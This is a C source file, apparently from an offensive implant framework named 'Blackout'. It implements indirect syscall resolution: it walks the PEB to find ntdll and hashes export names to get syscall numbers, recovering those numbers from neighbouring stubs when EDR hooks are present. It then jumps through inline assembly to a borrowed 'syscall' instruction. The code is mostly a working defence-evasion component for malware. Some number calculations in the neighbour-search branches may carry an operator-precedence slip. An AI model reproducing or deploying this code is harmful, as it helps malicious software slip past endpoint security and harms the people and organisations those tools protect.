#include <common.h>
#include <evasion.h>

FUNC BOOL FetchNtSyscall(
    ULONG    SysHash,
    PSYS_TBL SysTable
) {
    BLACKOUT_INSTANCE

    if ( SysHash != NULL )
        SysTable->SysHash = SysHash;
    else
        return FALSE;

    for ( UINT64 i = 0; i < Syscall().NtdllConf.NumberOfNames; i++ ) {

        PCHAR pcFuncName    = B_PTR( Syscall().NtdllConf.uModule + Syscall().NtdllConf.ArrayOfNames[i] );
        PVOID pFuncAddress  = C_PTR( Syscall().NtdllConf.uModule + Syscall().NtdllConf.ArrayOfAddr[Syscall().NtdllConf.ArrayOfOrdinals[i]]);

        // if syscall found
        if ( HASH_STR( pcFuncName ) == SysHash ) {

            SysTable->SysAddr = pFuncAddress;

            if (*((PBYTE)pFuncAddress) == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                SysTable->Ssn = (high << 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if ( *((PBYTE)pFuncAddress) == 0xE9 ) {

                for ( WORD idx = 1; idx <= RANGE; idx++ ) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        SysTable->Ssn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if ( *((PBYTE)pFuncAddress + idx * UP ) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        SysTable->Ssn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if ( *((PBYTE)pFuncAddress + 3) == 0xE9 ) {

                for ( WORD idx = 1; idx <= RANGE; idx++ ) {
                    // check neighboring syscall down
                    if ( *((PBYTE)pFuncAddress + idx * DOWN ) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        SysTable->Ssn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        SysTable->Ssn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }

    }

    if ( !SysTable->SysAddr )
        return FALSE;

    // looking somewhere random (0xFF byte away from the syscall address)
    ULONG_PTR uFuncAddress = (ULONG_PTR)SysTable->SysAddr + 0xFF;

    // getting the 'syscall' instruction of another syscall function
    for ( ULONG z = 0, x = 1; z <= RANGE; z++, x++) {
        if ( *((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05 ) {
            SysTable->SysInsAddr = ((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x & z]
        }
    }
    
    if ( 
        SysTable->Ssn        != NULL && 
        SysTable->SysAddr    != NULL && 
        SysTable->SysHash    != NULL && 
        SysTable->SysInsAddr != NULL 
    )
        return TRUE;
    else
        return FALSE;
}

FUNC BOOL InitNtdllConf(
    VOID
) {
    BLACKOUT_INSTANCE
    // getting peb 
    PPEB pPeb = Instance()->Teb->ProcessEnvironmentBlock;
    if (!pPeb || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // getting ntdll's base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the 'Blackout().Syscall.NtdllConf' structure's element
    Blackout().Syscall.NtdllConf.uModule         = uModule;
    Blackout().Syscall.NtdllConf.NumberOfNames   = pImgExpDir->NumberOfNames;
    Blackout().Syscall.NtdllConf.ArrayOfNames    = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
    Blackout().Syscall.NtdllConf.ArrayOfAddr     = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
    Blackout().Syscall.NtdllConf.ArrayOfOrdinals = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);

    // checking
    if (
        !Blackout().Syscall.NtdllConf.uModule       || 
        !Blackout().Syscall.NtdllConf.NumberOfNames || 
        !Blackout().Syscall.NtdllConf.ArrayOfNames  || 
        !Blackout().Syscall.NtdllConf.ArrayOfAddr   || 
        !Blackout().Syscall.NtdllConf.ArrayOfOrdinals
    )
        return FALSE;
    else
        return TRUE;
}

FUNC VOID SetSsn(
    DWORD  Ssn, 
    PVOID  SysInsAddr
) {
    __asm__ __volatile__(
        "xor eax, eax \n\t"                             // Clear eax (set to 0)
        "mov dword ptr [%0], eax \n\t"                  // Set wSystemCall to 0
        "mov rax, 0 \n\t"                               // Clear rax (set to 0)
        "mov qword ptr [%1], rax \n\t"                  // Set qSyscallInsAddr to 0
        "mov eax, ecx \n\t"                             // Copy the system call number (SSN) to eax
        "mov dword ptr [%0], eax \n\t"                  // Store SSN in wSystemCall
        "mov r8, rdx \n\t"                              // Copy the syscall instruction address to r8
        "mov qword ptr [%1], r8 \n\t"                   // Store the address in qSyscallInsAddr
        "ret"                                           // Return from function
        :                                               // Outputs
        : "r"(&Ssn), "r"(&SysInsAddr)      // Inputs
        : "rax", "eax", "r8", "ecx", "rdx", "memory"    // Clobbers
    );
}

FUNC VOID RunSyscall( 
    ...
) {
    BLACKOUT_INSTANCE

    __asm__ __volatile__(
        "xor r10, r10 \n\t"                             // Clear r10 (set to 0)
        "mov rax, rcx \n\t"                             // Copy rcx to rax
        "mov r10, rax \n\t"                             // Copy rax to r10
        "mov eax, dword ptr [%0] \n\t"                  // Load the system call number (SSN) into eax
        "jmp Run \n\t"                                  // Jump to label 'Run'
        "xor eax, eax \n\t"                             // Clear eax (not used here)
        "xor rcx, rcx \n\t"                             // Clear rcx (not used here)
        "shl r10, 2 \n\t"                               // Shift r10 left by 2 bits (not used here)
    "Run: \n\t"
        "jmp qword ptr [%1] \n\t"                       // Jump to the syscall instruction address
        "xor r10, r10 \n\t"                             // Clear r10 (reset to 0)
        "mov qword ptr [%1], r10 \n\t"                  // Reset qSyscallInsAddr to 0
        "ret"                                           // Return from function
        :                                               // Outputs
        : "r"(&Syscall().wSystemCall), "r"(&Syscall().qSyscallInsAdress)      // Inputs
        : "rax", "eax", "r10", "rcx", "memory"          // Clobbers
    );
}
